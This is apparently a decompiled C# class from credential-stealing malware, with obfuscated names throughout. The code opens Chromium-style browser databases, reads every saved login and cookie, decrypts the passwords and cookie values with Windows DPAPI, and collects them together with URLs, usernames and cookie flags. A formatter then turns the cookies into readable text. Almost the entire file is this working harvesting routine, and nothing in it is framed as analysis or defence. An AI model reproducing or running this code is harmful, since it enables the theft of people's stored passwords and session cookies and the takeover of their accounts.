using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;

// Token: 0x020000B2 RID: 178
public class GClass29
{
	// Token: 0x060004BB RID: 1211 RVA: 0x00010908 File Offset: 0x0000EB08
	public static List<GClass32> smethod_0(string datapath, string browser)
	{
		List<GClass32> list = new List<GClass32>();
		GClass33 gclass = null;
		if (!File.Exists(datapath))
		{
			return list;
		}
		List<GClass32> result;
		try
		{
			gclass = new GClass33(datapath);
			goto IL_24;
		}
		catch (Exception)
		{
			result = list;
		}
		return result;
		IL_24:
		if (!gclass.method_9("logins"))
		{
			return list;
		}
		int num = gclass.method_2();
		for (int i = 0; i < num; i++)
		{
			try
			{
				string text = gclass.method_5(i, "origin_url");
				string text2 = gclass.method_5(i, "username_value");
				string text3 = GClass29.smethod_2(gclass.method_5(i, "password_value"));
				if (!string.IsNullOrEmpty(text) && !string.IsNullOrEmpty(text2) && text3 != null)
				{
					list.Add(new GClass32
					{
						URL = text,
						Username = text2,
						Password = text3,
						Application = browser
					});
				}
			}
			catch (Exception)
			{
			}
		}
		return list;
	}

	// Token: 0x060004BC RID: 1212 RVA: 0x00010A00 File Offset: 0x0000EC00
	public static List<GClass29.GClass30> smethod_1(string dataPath, string browser)
	{
		List<GClass29.GClass30> list = new List<GClass29.GClass30>();
		GClass33 gclass = null;
		if (!File.Exists(dataPath))
		{
			return list;
		}
		List<GClass29.GClass30> result;
		try
		{
			gclass = new GClass33(dataPath);
			goto IL_26;
		}
		catch (Exception)
		{
			result = list;
		}
		return result;
		IL_26:
		if (!gclass.method_9("cookies"))
		{
			return list;
		}
		int num = gclass.method_2();
		for (int i = 0; i < num; i++)
		{
			try
			{
				string text = gclass.method_5(i, "host_key");
				string text2 = gclass.method_5(i, "name");
				string value = GClass29.smethod_2(gclass.method_5(i, "encrypted_value"));
				string path = gclass.method_5(i, "path");
				string expiresUTC = gclass.method_5(i, "expires_utc");
				string lastAccessUTC = gclass.method_5(i, "last_access_utc");
				bool secure = gclass.method_5(i, "secure") == "1";
				bool httpOnly = gclass.method_5(i, "httponly") == "1";
				bool expired = gclass.method_5(i, "has_expired") == "1";
				bool persistent = gclass.method_5(i, "persistent") == "1";
				bool priority = gclass.method_5(i, "priority") == "1";
				if (!string.IsNullOrEmpty(text) && !string.IsNullOrEmpty(text2) && !string.IsNullOrEmpty(value))
				{
					list.Add(new GClass29.GClass30
					{
						HostKey = text,
						Name = text2,
						Value = value,
						Path = path,
						ExpiresUTC = expiresUTC,
						LastAccessUTC = lastAccessUTC,
						Secure = secure,
						HttpOnly = httpOnly,
						Expired = expired,
						Persistent = persistent,
						Priority = priority,
						Browser = browser
					});
				}
			}
			catch (Exception)
			{
			}
		}
		return list;
	}

	// Token: 0x060004BD RID: 1213 RVA: 0x00010C10 File Offset: 0x0000EE10
	private static string smethod_2(string EncryptedData)
	{
		if (EncryptedData != null && EncryptedData.Length != 0)
		{
			byte[] bytes = ProtectedData.Unprotect(Encoding.Default.GetBytes(EncryptedData), null, DataProtectionScope.CurrentUser);
			return Encoding.UTF8.GetString(bytes);
		}
		return null;
	}

	// Token: 0x020000B3 RID: 179
	public class GClass30
	{
		// Token: 0x170000D8 RID: 216
		// (get) Token: 0x060004BF RID: 1215 RVA: 0x00004544 File Offset: 0x00002744
		// (set) Token: 0x060004C0 RID: 1216 RVA: 0x0000454C File Offset: 0x0000274C
		public string HostKey { get; set; }

		// Token: 0x170000D9 RID: 217
		// (get) Token: 0x060004C1 RID: 1217 RVA: 0x00004555 File Offset: 0x00002755
		// (set) Token: 0x060004C2 RID: 1218 RVA: 0x0000455D File Offset: 0x0000275D
		public string Name { get; set; }

		// Token: 0x170000DA RID: 218
		// (get) Token: 0x060004C3 RID: 1219 RVA: 0x00004566 File Offset: 0x00002766
		// (set) Token: 0x060004C4 RID: 1220 RVA: 0x0000456E File Offset: 0x0000276E
		public string Value { get; set; }

		// Token: 0x170000DB RID: 219
		// (get) Token: 0x060004C5 RID: 1221 RVA: 0x00004577 File Offset: 0x00002777
		// (set) Token: 0x060004C6 RID: 1222 RVA: 0x0000457F File Offset: 0x0000277F
		public string Path { get; set; }

		// Token: 0x170000DC RID: 220
		// (get) Token: 0x060004C7 RID: 1223 RVA: 0x00004588 File Offset: 0x00002788
		// (set) Token: 0x060004C8 RID: 1224 RVA: 0x00004590 File Offset: 0x00002790
		public string ExpiresUTC { get; set; }

		// Token: 0x170000DD RID: 221
		// (get) Token: 0x060004C9 RID: 1225 RVA: 0x00004599 File Offset: 0x00002799
		// (set) Token: 0x060004CA RID: 1226 RVA: 0x000045A1 File Offset: 0x000027A1
		public string LastAccessUTC { get; set; }

		// Token: 0x170000DE RID: 222
		// (get) Token: 0x060004CB RID: 1227 RVA: 0x000045AA File Offset: 0x000027AA
		// (set) Token: 0x060004CC RID: 1228 RVA: 0x000045B2 File Offset: 0x000027B2
		public bool Secure { get; set; }

		// Token: 0x170000DF RID: 223
		// (get) Token: 0x060004CD RID: 1229 RVA: 0x000045BB File Offset: 0x000027BB
		// (set) Token: 0x060004CE RID: 1230 RVA: 0x000045C3 File Offset: 0x000027C3
		public bool HttpOnly { get; set; }

		// Token: 0x170000E0 RID: 224
		// (get) Token: 0x060004CF RID: 1231 RVA: 0x000045CC File Offset: 0x000027CC
		// (set) Token: 0x060004D0 RID: 1232 RVA: 0x000045D4 File Offset: 0x000027D4
		public bool Expired { get; set; }

		// Token: 0x170000E1 RID: 225
		// (get) Token: 0x060004D1 RID: 1233 RVA: 0x000045DD File Offset: 0x000027DD
		// (set) Token: 0x060004D2 RID: 1234 RVA: 0x000045E5 File Offset: 0x000027E5
		public bool Persistent { get; set; }

		// Token: 0x170000E2 RID: 226
		// (get) Token: 0x060004D3 RID: 1235 RVA: 0x000045EE File Offset: 0x000027EE
		// (set) Token: 0x060004D4 RID: 1236 RVA: 0x000045F6 File Offset: 0x000027F6
		public bool Priority { get; set; }

		// Token: 0x170000E3 RID: 227
		// (get) Token: 0x060004D5 RID: 1237 RVA: 0x000045FF File Offset: 0x000027FF
		// (set) Token: 0x060004D6 RID: 1238 RVA: 0x00004607 File Offset: 0x00002807
		public string Browser { get; set; }

		// Token: 0x060004D7 RID: 1239 RVA: 0x00010C48 File Offset: 0x0000EE48
		public virtual string vmethod_0()
		{
			return string.Format("Domain: {1}{0}Cookie Name: {2}{0}Value: {3}{0}Path: {4}{0}Expired: {5}{0}HttpOnly: {6}{0}Secure: {7}", new object[]
			{
				Environment.NewLine,
				this.HostKey,
				this.Name,
				this.Value,
				this.Path,
				this.Expired,
				this.HttpOnly,
				this.Secure
			});
		}

		// Token: 0x040001F7 RID: 503
		[CompilerGenerated]
		private string string_0;

		// Token: 0x040001F8 RID: 504
		[CompilerGenerated]
		private string string_1;

		// Token: 0x040001F9 RID: 505
		[CompilerGenerated]
		private string string_2;

		// Token: 0x040001FA RID: 506
		[CompilerGenerated]
		private string string_3;

		// Token: 0x040001FB RID: 507
		[CompilerGenerated]
		private string string_4;

		// Token: 0x040001FC RID: 508
		[CompilerGenerated]
		private string string_5;

		// Token: 0x040001FD RID: 509
		[CompilerGenerated]
		private bool bool_0;

		// Token: 0x040001FE RID: 510
		[CompilerGenerated]
		private bool bool_1;

		// Token: 0x040001FF RID: 511
		[CompilerGenerated]
		private bool bool_2;

		// Token: 0x04000200 RID: 512
		[CompilerGenerated]
		private bool bool_3;

		// Token: 0x04000201 RID: 513
		[CompilerGenerated]
		private bool bool_4;

		// Token: 0x04000202 RID: 514
		[CompilerGenerated]
		private string string_6;
	}
}
